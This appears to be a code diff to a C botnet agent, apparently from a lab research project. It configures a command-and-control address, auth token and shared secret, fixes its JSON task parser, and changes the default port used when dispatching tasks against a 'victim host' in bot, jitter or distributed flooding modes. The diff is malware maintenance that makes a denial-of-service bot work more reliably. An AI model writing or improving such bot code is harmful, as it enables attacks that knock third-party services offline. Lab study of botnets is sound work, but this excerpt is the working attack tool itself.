@@ -35,9 +35,9 @@
 #include <openssl/buffer.h>
 
 /* ── Configuration ─────────────────────────────────────────── */
-#define C2_IP          "192.168.100.10"
+#define C2_IP          "127.0.0.1"
 #define C2_PORT        5000
-#define AUTH_TOKEN     "LAB_RESEARCH_TOKEN_2026"
+#define AUTH_TOKEN     "aw"
 #define SHARED_SECRET  "AUA_LAB_2026_KEY"
 #define HEARTBEAT_SEC  5
 #define BOT_ID_LEN     32
@@ -120,10 +120,13 @@ static int aes_cbc_decrypt(const unsigned char *ct, int ct_len,
 static int json_str_field(const char *json, const char *key,
                            char *out, int out_len) {
     char needle[64];
-    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
+    snprintf(needle, sizeof(needle), "\"%s\":", key);
     const char *p = strstr(json, needle);
     if (!p) return 0;
     p += strlen(needle);
+    while (*p == ' ') p++;   /* skip optional space after colon */
+    if (*p != '"') return 0;
+    p++;                      /* skip opening quote */
     const char *end = strchr(p, '"');
     if (!end) return 0;
     int len = (int)(end - p);
@@ -466,7 +469,7 @@ static void dispatch_task(const char *task_json) {
     char target_ip[48] = "192.168.100.20";
     json_str_field(task_json, "type",      type,      sizeof(type));
     json_str_field(task_json, "target_ip", target_ip, sizeof(target_ip));
-    int port     = json_int_field(task_json, "target_port", 80);
+    int port     = json_int_field(task_json, "target_port", 8080);
     int duration = json_int_field(task_json, "duration",    10);
     float cpu    = 0.25f;
 
@@ -516,7 +519,7 @@ static void dispatch_task(const char *task_json) {
          *
          * Fields parsed from task JSON:
          *   target_ip   — victim host  (default 192.168.100.20)
-         *   target_port — HTTP port    (default 80)
+         *   target_port — HTTP port    (8080)
          *   duration    — seconds      (default 120, passed as shell timeout)
          *   mode        — "bot"|"jitter"|"distributed"  (default "jitter")
          *   jitter      — int ms       (default 200)
